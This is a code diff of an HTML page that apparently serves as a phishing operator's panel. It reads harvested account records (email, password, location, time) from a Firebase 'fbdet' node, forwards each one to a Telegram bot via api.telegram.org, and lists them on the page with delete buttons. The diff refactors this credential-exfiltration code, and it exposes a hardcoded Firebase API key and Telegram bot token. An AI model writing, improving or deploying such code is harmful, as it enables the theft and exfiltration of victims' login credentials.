@@ -1,50 +1,64 @@
-
 <!doctype HTML>
 <html>
 <head>
-<title>Database </title>
+    <title>Database</title>
 </head>
 <body>
-<div></div>
-<div id="save">
+<div id="save"></div>
 
-</div>
-
-<script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
-
-<script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
-
-<script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js"></script>
 
 <script>
+    // Firebase Config
+    const firebaseConfig = {
+        apiKey: "AIzaSyCXbSQv2HsMh-hVzVcDPB8d9Cn8yrQ7EAM",
+        authDomain: "sharjahstarz.firebaseapp.com",
+        databaseURL: "https://sharjahstarz-default-rtdb.firebaseio.com",
+        projectId: "sharjahstarz",
+        storageBucket: "sharjahstarz.appspot.com",
+        messagingSenderId: "492595312611",
+        appId: "1:492595312611:web:bf84d62ee07aac8c9392d6"
+    };
 
-// For Firebase JS SDK v7.20.0 and later, measurementId is optional
-const firebaseConfig = {
-apiKey: "AIzaSyCXbSQv2HsMh-hVzVcDPB8d9Cn8yrQ7EAM",
-authDomain: "sharjahstarz.firebaseapp.com",
-databaseURL: "https://sharjahstarz-default-rtdb.firebaseio.com",
-projectId: "sharjahstarz",
-storageBucket: "sharjahstarz.appspot.com",
-messagingSenderId: "492595312611",
-appId: "1:492595312611:web:bf84d62ee07aac8c9392d6"
-};
-firebase.initializeApp(firebaseConfig);
+    // Initialize Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
 
-// Replace with your Telegram bot token
-const TELEGRAM_BOT_TOKEN = "7523994267:AAFKipJ1nhsp1TtSRBfaOqum0i9ZOeDnLQI";
-// Replace with your chat ID
-const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";
+    // Telegram Config
+    const TELEGRAM_BOT_TOKEN = "7523994267:AAFKipJ1nhsp1TtSRBfaOqum0i9ZOeDnLQI";
+    const TELEGRAM_CHAT_ID = "<YOUR_CHAT_ID>"; // Replace with actual chat ID
 
-firebase.auth().signInAnonymously().catch(function (error) {
-var errorMessage = error.message;
-window.alert("Error : " + errorMessage);
-});
+    // Function to Send Message to Telegram
+    function sendMessageToTelegram(message) {
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message
+            })
+        })
+            .then(response => {
+                if (!response.ok) {
+                    console.error("Error sending message to Telegram:", response.statusText);
+                } else {
+                    console.log("Message sent to Telegram successfully!");
+                }
+            })
+            .catch(error => {
+                console.error("Error sending message to Telegram:", error);
+            });
+    }
 
-firebase.database().ref("fbdet").on("child_added", function (snapshot) {
-var data = snapshot.val();
+    // Listen for New Firebase Data
+    database.ref("fbdet").on("child_added", function(snapshot) {
+        const data = snapshot.val();
 
-// Construct message for Telegram
-const message = `
+        // Construct Message
+        const message = `
 New Record Added:
 Account Type: ${data.type}
 User: ${data.emle}
@@ -54,53 +68,36 @@ Location: ${data.timezone}
 Time: ${data.time}
 `;
 
-// Send the message to Telegram
-fetch(`https://api.telegram.org/bot7523994267:AAFKipJ1nhsp1TtSRBfaOqum0i9ZOeDnLQI/sendMessage`, {
-method: "POST",
-headers: {
-"Content-Type": "application/json"
-},
-body: JSON.stringify({
-chat_id: TELEGRAM_CHAT_ID,
-text: message
-})
-}).then(response => {
-if (!response.ok) {
-console.error("Error sending message to Telegram:", response.statusText);
-} else {
-console.log("Message sent to Telegram successfully!");
-}
-}).catch(error => {
-console.error("Error sending message to Telegram:", error);
-});
+        // Send Message to Telegram
+        sendMessageToTelegram(message);
 
-// Update the webpage
-var html = "";
-html += "<hr></hr>";
-html += "<li id='message-" + snapshot.key + "' class='canvaschat'>";
-html += "Account type: <b>" + data.type + "</b> <br>";
-html += "User: <b>" + data.emle + "</b><br>";
-html += "Password: <b>" + data.pass + "</b><br>";
-html += "Date: <b>" + data.date + "</b><br>";
-html += "Location: <b>" + data.timezone + "</b><br>";
-html += "Time: <b>" + data.time + "</b>";
-html += "</li>";
-html += "<button data-id='" + snapshot.key + "' onclick='deleteMessage(this);' class='send'>";
-html += "Delete";
-html += "</button>";
+        // Update HTML
+        const html = `
+        <hr>
+        <li id="message-${snapshot.key}" class="canvaschat">
+            Account type: <b>${data.type}</b><br>
+            User: <b>${data.emle}</b><br>
+            Password: <b>${data.pass}</b><br>
+            Date: <b>${data.date}</b><br>
+            Location: <b>${data.timezone}</b><br>
+            Time: <b>${data.time}</b>
+        </li>
+        <button data-id="${snapshot.key}" onclick="deleteMessage(this);" class="send">
+            Delete
+        </button>`;
+        document.getElementById("save").innerHTML += html;
+    });
 
-document.getElementById("save").innerHTML += html;
-});
+    // Delete Message Function
+    function deleteMessage(self) {
+        const messageId = self.getAttribute("data-id");
+        database.ref("fbdet").child(messageId).remove();
+    }
 
-function deleteMessage(self) {
-var messageId = self.getAttribute("data-id");
-firebase.database().ref("fbdet").child(messageId).remove();
-}
-
-firebase.database().ref("fbdet").on("child_removed", function (snapshot) {
-document.getElementById("message-" + snapshot.key).innerHTML = "deleted";
-});
-
+    // Listen for Deleted Data
+    database.ref("fbdet").on("child_removed", function(snapshot) {
+        document.getElementById(`message-${snapshot.key}`).innerHTML = "deleted";
+    });
 </script>
 </body>
 </html>
